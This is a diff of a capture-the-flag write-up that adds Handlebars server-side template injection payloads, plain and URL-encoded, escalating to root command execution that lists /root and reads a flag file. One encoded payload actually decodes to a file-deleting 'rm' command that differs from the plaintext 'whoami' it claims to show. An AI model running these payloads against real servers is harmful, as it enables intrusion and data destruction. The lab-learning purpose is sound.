@@ -2573,6 +2573,113 @@ In doing some recon, we discover that this is vulnerable to anm SSTI(Server Side
 
 > Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.
 
+Further browsing the site shows somne potential exploits used against Node,js backend libraries. One in particular interest, is the exploit specifically for handlebars:
+
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+URLencoded:
+%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
+
+```
+We can try passing this URL encoded text into the form submission to see if we cab perform an SSTI:
+
+ ![Screenshot_2022-07-25_17_21_56](https://user-images.githubusercontent.com/59018247/180876299-2f2d8295-dab6-495d-8020-973de67a7238.png)
+ 
+ ![Screenshot_2022-07-25_17_22_56](https://user-images.githubusercontent.com/59018247/180876439-698a0937-6732-4b76-b410-d943dc6841b5.png)
+
+We get an error on the backend about require not being defined:
+
+```    
+{{this.push "return require('child_process').exec('whoami');"}}
+```
+
+With some knowledge of node.js, require is not in the global scope and is not accessible here. We can try substituing is for another object that can be passed locally. 
+
+In this case, we can try ```process```:
+
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.mainModule;"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d
+```
+
+![Screenshot_2022-07-25_17_35_51](https://user-images.githubusercontent.com/59018247/180878118-2f12deb4-3c90-44d7-8dda-07149366a2dc.png)
+
+
+We can see here we no longer recieved an error, and displayed the text 
+
+```
+We will contact you at: e
+2
+[object Object]
+function Function() { [native code] }
+2
+[object Object]
+[object Object]
+```
+We are getting close here and can try to appended require with process to override it:
+
+![Screenshot_2022-07-25_18_03_44](https://user-images.githubusercontent.com/59018247/180881599-24c0a10e-d4ff-4621-92a7-751491f74cab.png)
+
+Passing the following command shows that we are root!
+
+```
+       We will contact you at:       e
+      2
+      [object Object]
+        function Function() { [native code] }
+        2
+        [object Object]
+            root
+```
+We can now append execSync to start pass commands on the server directly:
+
+```
+{{this.push "return process.mainModule.require('child_process').execSync('ls');"}}
+```
+
+![Screenshot_2022-07-25_18_06_41](https://user-images.githubusercontent.com/59018247/180881934-adf32cad-af11-4d05-bb72-b14e9bb09d93.png)
+
+
+
+
 We can modify the etc/hosts file to resolve this issue:
 
 ![Screenshot_2022-07-24_21_21_48](https://user-images.githubusercontent.com/59018247/180675802-e956590f-ddeb-43c0-a9f6-e779534c24d0.png)
@@ -2582,72 +2689,48 @@ After making the changes, we can now view the proper website:
 
 ![Screenshot_2022-07-24_21_24_49](https://user-images.githubusercontent.com/59018247/180676009-e3ed43c7-46c1-4fcb-9cb6-8db16d687c9c.png)
 
+```
+index.js
+node_modules
+package.json
+package-lock.json
+public
+routes
+views
+```
+Executing that command exposed the server directory. We can now poke around to see what we find:
+
 
 
 In snooping around, we can first use gobuster to see if there are any hidden pages:
 
 ```
-└─$ sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u ignition.htb
-
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://ignition.htb
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Timeout:                 10s
-===============================================================
-2022/07/24 21:28:41 Starting gobuster in directory enumeration mode
-===============================================================
-/0                    (Status: 200) [Size: 25803]
-/admin                (Status: 200) [Size: 7095] 
-/catalog              (Status: 302) [Size: 0] [--> http://ignition.htb/]
-/checkout             (Status: 302) [Size: 0] [--> http://ignition.htb/checkout/cart/]
-/cms                  (Status: 200) [Size: 25817]                                     
-/contact              (Status: 200) [Size: 28673]                                     
-Progress: 1308 / 4615 (28.34%)                                                       ^C
-[!] Keyboard interrupt detected, terminating.
-                                                                                      
-===============================================================
-2022/07/24 21:32:50 Finished
-===============================================================
+{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
+```
+If we browse the root directory we find:
 
 ```
-We find an admin page, asking for a username and password:
+Backend
+flag.txt
+snap
+```
 
-![Screenshot_2022-07-24_21_33_32](https://user-images.githubusercontent.com/59018247/180676670-bd39d2d6-2aaa-4b11-a03a-deddd400c75c.png)
+```
+{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
+```
+Therefore, we now execute out final command to grab our twelfth flag!
 
-According to the web error messages, we can see that they force the user to add numbers to their passwords for extra security. This is a good opportunity to try some common passwords and adding a basic number scheme to them:
+![Screenshot_2022-07-25_18_13_18](https://user-images.githubusercontent.com/59018247/180882887-61b25f31-806d-4150-951d-92319038bbe6.png)
 
-| # | 	Username 	| Password |
-| :-----------: | :-----------: | :-----------: |
-| 1 | 	admin   |    	admin123   | 
-| 2 | 	admin  |    	administrator123   | 
-| 3 | 	admin 	 |  user123       | 
-| 4 | 	admin 	 |  test123       | 
-| 5 | 	admin |  	ubuntu123    | 
-| 6 | 	admin |  	qwerty123    | 
-
-In trying all of these combinations, we find that #6 finally grants us access!
-
-![Screenshot_2022-07-24_21_41_00](https://user-images.githubusercontent.com/59018247/180677303-aac01574-0e46-4769-bf51-55e972bbfe3d.png)
-
-
-We can now gather out eleventh flag located at in the logon dashboard!
-
-## Conclusions - Level 5 Ignition
+## Conclusions - Level 6 Bike
 
 | # | 	Tools 	| Description |
 | :-----------: | :-----------: | :-----------: |
 | 1 | 	nmap   |    	Used for scanning ports on hosts. | 
-| 2 | 	gobuster   |    	Used to brute force directories, DNS subdomains, virtual host names, and amazon s3 buckets | 
+| 2 | 	Burp Suite   |    	The class-leading vulnerability scanning, penetration testing, and web app security platform.| 
 
 | # | 	Vulnerabilities 	| Critical | High | Medium | Low |
 | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
-| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
+| 1 | 	Server Side Template Injection   |    	X |  |  |  |
 
-Using nmap, we were able to discover the host had a web server open on port 80. We then used gobuster as a means for finding an administration page hidden in its directory. Finally, we guess a common sequence of usernames and passwords with trailing numbers that allowed us access to the dashboard.
+Using nmap, we were able to discover the host had a web server open on port 80. We then analyzed the input field, and realized it was open to a server side template injection exploit. Finally using Burpe Suite, we were able to inject the correct payload for the handlebar library vulnerability that gave us server side execution.
